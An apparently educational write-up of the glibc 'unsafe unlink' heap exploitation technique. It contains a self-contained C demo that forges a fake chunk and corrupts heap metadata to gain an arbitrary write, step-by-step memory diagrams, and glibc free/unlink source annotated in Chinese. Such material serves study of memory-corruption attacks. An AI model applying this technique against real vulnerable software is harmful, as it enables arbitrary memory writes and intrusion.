```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


uint64_t *chunk0_ptr;

int main()
{
	fprintf(stderr, "Welcome to unsafe unlink 2.0!\n");
	fprintf(stderr, "Tested in Ubuntu 14.04/16.04 64bit.\n");
	fprintf(stderr, "This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
	fprintf(stderr, "The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");

	int malloc_size = 0x80; //we want to be big enough not to use fastbins
	int header_size = 2;

	fprintf(stderr, "The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");

	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
	fprintf(stderr, "The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
	fprintf(stderr, "The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

	fprintf(stderr, "We create a fake chunk inside chunk0.\n");
	fprintf(stderr, "We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	fprintf(stderr, "We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
	fprintf(stderr, "With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
	fprintf(stderr, "Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
	fprintf(stderr, "Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);

	fprintf(stderr, "We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	fprintf(stderr, "We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
	fprintf(stderr, "It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
	chunk1_hdr[0] = malloc_size;
	fprintf(stderr, "If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
	fprintf(stderr, "We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
	chunk1_hdr[1] &= ~1;

	fprintf(stderr, "Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
	fprintf(stderr, "You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
	free(chunk1_ptr);

	fprintf(stderr, "At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
	char victim_string[8];
	strcpy(victim_string,"Hello!~");
	chunk0_ptr[3] = (uint64_t) victim_string;

	fprintf(stderr, "chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
	fprintf(stderr, "Original value: %s\n",victim_string);
	chunk0_ptr[0] = 0x4141414142424242LL;
	fprintf(stderr, "New Value: %s\n",victim_string);
}
```







```
                                                                                   chunk0
                                                                            +--------------------+
                                                                            |       0x0          |
                                                                            +--------------------+
               |                    |                                       |       0x91         |
               |                    |                   +------------------>---------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               +--------------------+                   |
0x555555558070 |     chunk0_ptr     +-------------------+
               +--------------------+
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |                                              chunk1
               |                    |                                       +--------------------+
               |                    |                                       |       0x0          |
               |                    |                                       +--------------------+
               |                    |                                       |       0x91         |
               |                    |                   +------------------>---------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               +--------------------+                   |                   |                    |
0x7fffffffdeb0 |     chunk1_ptr     +-------------------+                   |                    |
               +--------------------+                                       +--------------------+
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |

```





```
                      chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);





                                                                                   chunk0
                                                                            +--------------------+
                                                                            |       0x0          |
                                                                            +--------------------+
               |                    |                                       |       0x91         |
               |                    |                   +------------------>---------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               |                    |                   |                   |   0x555555558058   |
               |                    |                   |                   +--------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               +--------------------+                   |
0x555555558070 |     chunk0_ptr     +-------------------+
               +--------------------+
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |                                              chunk1
               |                    |                                       +--------------------+
               |                    |                                       |       0x0          |
               |                    |                                       +--------------------+
               |                    |                                       |       0x91         |
               |                    |                   +------------------>---------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               +--------------------+                   |                   |                    |
0x7fffffffdeb0 |     chunk1_ptr     +-------------------+                   |                    |
               +--------------------+                                       +--------------------+
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |

```







```
                     chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);





                                                                                   chunk0
                                                                            +--------------------+
                                                                            |       0x0          |
                                                                            +--------------------+
               |                    |                                       |       0x91         |
               |                    |                   +------------------>---------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               |                    |                   |                   |                    |
               +--------------------+                   |                   +--------------------+
               |                    |            +--------------------------+   0x555555558058   |
               +---------------------<-----------+      |                   +--------------------+
0x555555558058 |                    |              +------------------------+   0x555555558060   |
               +--------------------+ <------------+    |                   +--------------------+
0x555555558060 |                    |                   |                   |                    |
               +--------------------+                   |                   |                    |
0x555555558068 |                    |                   |                   +--------------------+
               +--------------------+                   |
0x555555558070 |     chunk0_ptr     +-------------------+
               +--------------------+
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |                                              chunk1
               |                    |                                       +--------------------+
               |                    |                                       |       0x0          |
               |                    |                                       +--------------------+
               |                    |                                       |       0x91         |
               |                    |                   +------------------>---------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               +--------------------+                   |                   |                    |
0x7fffffffdeb0 |     chunk1_ptr     +-------------------+                   |                    |
               +--------------------+                                       +--------------------+
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |

```





```
                         uint64_t *chunk1_hdr = chunk1_ptr - header_size;



                                                                                   chunk0
                                                                            +--------------------+
                                                                            |       0x0          |
                                                                            +--------------------+
               |                    |                                       |       0x91         |
               |                    |                   +------------------>---------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               |                    |                   |                   |                    |
               +--------------------+                   |                   +--------------------+
               |                    |            +--------------------------+   0x555555558058   |
               +---------------------<-----------+      |                   +--------------------+
0x555555558058 |                    |              +------------------------+   0x555555558060   |
               +--------------------+ <------------+    |                   +--------------------+
0x555555558060 |                    |                   |                   |                    |
               +--------------------+                   |                   |                    |
0x555555558068 |                    |                   |                   +--------------------+
               +--------------------+                   |
0x555555558070 |     chunk0_ptr     +-------------------+
               +--------------------+
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |                                              chunk1
               |                    |                                       +--------------------+<-----------+ chunk1_hdr
               |                    |                                       |       0x0          |
               |                    |                                       +--------------------+
               |                    |                                       |       0x91         |
               |                    |                   +------------------>---------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               +--------------------+                   |                   |                    |
0x7fffffffdeb0 |     chunk1_ptr     +-------------------+                   |                    |
               +--------------------+                                       +--------------------+
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |

```





```
                                 chunk1_hdr[0] = malloc_size;




                                                                                   chunk0
                                                                            +--------------------+
                                                                            |       0x0          |
                                                                            +--------------------+
               |                    |                                       |       0x91         |
               |                    |                   +------------------>---------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               |                    |                   |                   |                    |
               +--------------------+                   |                   +--------------------+
               |                    |            +--------------------------+   0x555555558058   |
               +---------------------<-----------+      |                   +--------------------+
0x555555558058 |                    |              +------------------------+   0x555555558060   |
               +--------------------+ <------------+    |                   +--------------------+
0x555555558060 |                    |                   |                   |                    |
               +--------------------+                   |                   |                    |
0x555555558068 |                    |                   |                   +--------------------+
               +--------------------+                   |
0x555555558070 |     chunk0_ptr     +-------------------+
               +--------------------+
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |                                              chunk1
               |                    |                                       +--------------------+<-----------+ chunk1_hdr
               |                    |                                       |       0x80         |
               |                    |                                       +--------------------+
               |                    |                                       |       0x91         |
               |                    |                   +------------------>---------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               +--------------------+                   |                   |                    |
0x7fffffffdeb0 |     chunk1_ptr     +-------------------+                   |                    |
               +--------------------+                                       +--------------------+
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |

```





```
                                 chunk1_hdr[1] &= ~1;



                                                                                   chunk0
                                                                            +--------------------+
                                                                            |       0x0          |
                                                                            +--------------------+
               |                    |                                       |       0x91         |
               |                    |                   +------------------>---------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               |                    |                   |                   |                    |
               +--------------------+                   |                   +--------------------+
               |                    |            +--------------------------+   0x555555558058   |
               +---------------------<-----------+      |                   +--------------------+
0x555555558058 |                    |              +------------------------+   0x555555558060   |
               +--------------------+ <------------+    |                   +--------------------+
0x555555558060 |                    |                   |                   |                    |
               +--------------------+                   |                   |                    |
0x555555558068 |                    |                   |                   +--------------------+
               +--------------------+                   |
0x555555558070 |     chunk0_ptr     +-------------------+
               +--------------------+
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |                                              chunk1
               |                    |                                       +--------------------+<-----------+ chunk1_hdr
               |                    |                                       |       0x80         |
               |                    |                                       +--------------------+
               |                    |                                       |       0x90         |
               |                    |                   +------------------>---------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   +--------------------+
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               |                    |                   |                   |                    |
               +--------------------+                   |                   |                    |
0x7fffffffdeb0 |     chunk1_ptr     +-------------------+                   |                    |
               +--------------------+                                       +--------------------+
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |
               |                    |

```





```c
  /*
    Consolidate other non-mmapped chunks as they arrive.
  */

  else if (!chunk_is_mmapped(p)) {
    if (! have_lock) {
      (void)mutex_lock(&av->mutex);
      locked = 1;
    }
      
    // 在这里 chunk1 的 nextchunk 是 top chunk
    nextchunk = chunk_at_offset(p, size);

    /* Lightweight tests: check whether the block is already the
       top block.  */
    // 检查你是不是 free 了 top chunk
    if (__glibc_unlikely (p == av->top))
      {
	errstr = "double free or corruption (top)";
	goto errout;
      }
    /* Or whether the next chunk is beyond the boundaries of the arena.  */
    // 检查 nextchunk 是不是在 分配区 之外
    if (__builtin_expect (contiguous (av)
			  && (char *) nextchunk
			  >= ((char *) av->top + chunksize(av->top)), 0))
      {
	errstr = "double free or corruption (out)";
	goto errout;
      }
    /* Or whether the block is actually not marked used.  */
    // 检查要 free 的 chunk 是不是 inuse 状态 (prev_inuse 就是检查传进来的 chunk 的 inuse 标志位,这个标志为标志着 内存位置上相邻的上一个 chunk 是不是 inuse 状态)
    if (__glibc_unlikely (!prev_inuse(nextchunk)))
      {
	errstr = "double free or corruption (!prev)";
	goto errout;
      }
      
    // 获取内存上相邻的下一个 chunk 的 size
    nextsize = chunksize(nextchunk);
   // 检查 nextchunk 的 size 有没有被破坏
    if (__builtin_expect (nextchunk->size <= 2 * SIZE_SZ, 0)
	|| __builtin_expect (nextsize >= av->system_mem, 0))
      {
	errstr = "free(): invalid next size (normal)";
	goto errout;
      }
      
    // 抹除 chunk 的残留的用户数据
    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);

    /* consolidate backward */
    // 检查 内存上位置相邻 的上一个 chunk 有没有 inuse
    // chunk1 的上一个 chunk 是 chunk0
    // 而在刚刚 chunk1_hdr[1] &= ~1; 已经把 chunk1 的 inuse 标志位设置成了 0,表示 chunk0 已经 free
    if (!prev_inuse(p)) {
      // 直接触发合并,把 当前 chunk 和 prevchunk 合并
      prevsize = p->prev_size;
      // size + prevsize 就是把两个块的 size 相加,当成合并后的 chunk 的 size
      size += prevsize;
      // p 就是合并后的 chunk
      p = chunk_at_offset(p, -((long) prevsize));
      // 合并后要把 prevchunk 从 bin 里面移除
      unlink(av, p, bck, fwd);
    }
```

这就是利用点了

```c
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            \
    FD = P->fd;	  保存 p 的 fd 字段					      \
    BK = P->bk;		保存 p 的 bk 字段						      \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      \
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
    else {								      \
        FD->bk = BK;							      \
        BK->fd = FD;							      \
        if (!in_smallbin_range (P->size)				      \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {		      \
	    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)	      \
		|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
	      malloc_printerr (check_action,				      \
			       "corrupted double-linked list (not small)",    \
			       P, AV);					      \
            if (FD->fd_nextsize == NULL) {				      \
                if (P->fd_nextsize == P)				      \
                  FD->fd_nextsize = FD->bk_nextsize = FD;		      \
                else {							      \
                    FD->fd_nextsize = P->fd_nextsize;			      \
                    FD->bk_nextsize = P->bk_nextsize;			      \
                    P->fd_nextsize->bk_nextsize = FD;			      \
                    P->bk_nextsize->fd_nextsize = FD;			      \
                  }							      \
              } else {							      \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      \
              }								      \
          }								      \
      }									      \
}
```



我们要绕过的是这个检查

```c
FD->bk != P || BK->fd != P
```

就是 

```
p -> fd -> bk == p
p -> bk -> fd == p
```

就是检查 p 的 fd 字段指向的 chunk 的 bk 必须指向 p,正常情况下, smallbin 里面的 chunk 都是这样的,没有毛病

```

```





```
0x555555559000 PREV_INUSE {
  prev_size = 0,
  size = 145,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x555555559090 PREV_INUSE {
  prev_size = 0,
  size = 145,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x555555559120 PREV_INUSE {
  prev_size = 0,
  size = 134881,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
```

